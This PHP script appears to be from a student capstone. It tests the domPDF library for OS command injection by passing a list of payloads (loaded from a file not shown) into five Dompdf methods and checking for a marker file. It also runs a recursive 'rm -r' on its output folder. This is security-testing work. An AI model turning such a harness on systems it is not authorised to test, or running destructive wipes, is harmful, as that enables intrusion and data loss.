<!-- File: os.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (OS Command Injection) for domPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';
use Dompdf\Dompdf;

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
    $pdf = new Dompdf();
    $pdf->setPaper('A4', 'landscape');
    $canvas = $pdf->getCanvas();
    $canvas->set_page_count(1);
    $canvas->save();

	return $pdf;
}

function check_test_file(string $endpoint, string $command) {
    if (file_exists('/var/www/myapp/test')) {
        echo "Endpoint: ".$endpoint."\nCommand: ".$command."<br/><br/>";
    }
}

// loadHTML
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();

    $pdf->loadHtml($command);
    $pdf->render();

    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/loadHTML'.$i.'.pdf', $output);
    $i++;
    check_test_file("loadHTML", $command);
}

// page_text
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->page_text(20, 20, $command, '/var/www/myapp/vendor/dompdf/dompdf/lib/fonts/Courier/', 18);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/page_text'.$i.'.pdf', $output);
    $i++;
    check_test_file("Page_Text", $command);
}

// Text
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->text(120, 120, $command, '/var/www/myapp/vendor/dompdf/dompdf/lib/fonts/Courier/', 18);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/text'.$i.'.pdf', $output);
    $i++;
    check_test_file("Text", $command);
}

// Add_Link
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->add_link($command, 30, 30, 50, 50);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/add_link'.$i.'.pdf', $output);
    $i++;
    check_test_file("Add_Link", $command);
}

// Add_Info
$i = 0;
foreach ($os_commands as $command) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->add_info($command, $command);

    $canvas->save();
    $output = $pdf->output();
    file_put_contents('/var/www/myapp/pdfs/add_info'.$i.'.pdf', $output);
    $i++;
    check_test_file("Add_Info", $command);
}


?>
<h1 style="text-align:center;">Operating System Command Injection Complete!</h1>